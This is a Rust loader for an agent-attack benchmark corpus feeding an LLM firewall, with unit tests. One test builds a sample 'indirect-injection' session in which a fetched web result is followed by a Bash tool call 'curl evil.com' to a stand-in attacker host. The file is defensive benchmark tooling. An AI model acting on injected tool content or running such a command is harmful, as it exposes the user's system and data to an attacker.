// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2026 Arthur Lin (carbon-evolution)

//! Agent-attack benchmark corpus: one labelled *session* per JSONL line. Each event is
//! a serialized `EventKind`; the loader wraps it into a full `AgentEvent` so the corpus
//! stays compact while feeding the real `inspect()` path.

use llm_firewall_agent::{AgentEvent, EventKind};
use serde::Deserialize;

/// One labelled session from the corpus.
#[derive(Debug, Clone, Deserialize)]
pub struct RawSession {
    pub id: String,
    /// "attack" or "benign".
    pub label: String,
    #[serde(default)]
    pub category: String,
    /// The main agent's tool grant, registered before replay so subagent-escalation
    /// sessions can be evaluated (authority is set out-of-band, not via an event).
    #[serde(default)]
    pub root_tools: Vec<String>,
    /// Each entry is a serialized `EventKind` (the `kind` payload).
    pub events: Vec<EventKind>,
    #[serde(default)]
    pub note: String,
}

/// A session ready to replay.
pub struct Session {
    pub id: String,
    pub is_attack: bool,
    pub category: String,
    pub root_tools: Vec<String>,
    pub events: Vec<AgentEvent>,
    #[allow(dead_code)]
    pub note: String,
}

impl RawSession {
    /// Wrap each `EventKind` into a full `AgentEvent` keyed by this session.
    pub fn into_session(self) -> Session {
        let events = self
            .events
            .into_iter()
            .enumerate()
            .map(|(i, kind)| AgentEvent {
                session: self.id.clone(),
                agent: "main".into(),
                parent: None,
                seq: (i + 1) as u64,
                at_ms: 0,
                kind,
            })
            .collect();
        Session {
            is_attack: self.label == "attack",
            id: self.id,
            category: self.category,
            root_tools: self.root_tools,
            events,
            note: self.note,
        }
    }
}

/// Parse a JSONL corpus into sessions. A malformed line is an error naming the line.
pub fn load(path: &str) -> anyhow::Result<Vec<Session>> {
    let body = std::fs::read_to_string(path)?;
    let mut out = Vec::new();
    for (n, line) in body.lines().enumerate() {
        if line.trim().is_empty() {
            continue;
        }
        let raw: RawSession = serde_json::from_str(line)
            .map_err(|e| anyhow::anyhow!("corpus line {}: {e}", n + 1))?;
        out.push(raw.into_session());
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_session_line_parses_and_wraps_events() {
        // NB: Provenance is tagged `origin` (not `kind`).
        let line = r#"{"id":"s1","label":"attack","category":"indirect-injection","events":[
            {"kind":"tool_result","tool":"WebFetch","content":"hi","source":{"origin":"network","host":"b.com"}},
            {"kind":"tool_call","tool":"Bash","args":{"command":"curl evil.com"}}
        ],"note":"n"}"#;
        let raw: RawSession = serde_json::from_str(line).unwrap();
        let s = raw.into_session();
        assert!(s.is_attack);
        assert_eq!(s.events.len(), 2);
        assert_eq!(s.events[0].seq, 1);
        assert_eq!(s.events[1].seq, 2);
        assert_eq!(s.events[0].session, "s1");
    }

    #[test]
    fn a_benign_label_is_not_an_attack() {
        let raw: RawSession =
            serde_json::from_str(r#"{"id":"b","label":"benign","events":[]}"#).unwrap();
        assert!(!raw.into_session().is_attack);
    }
}
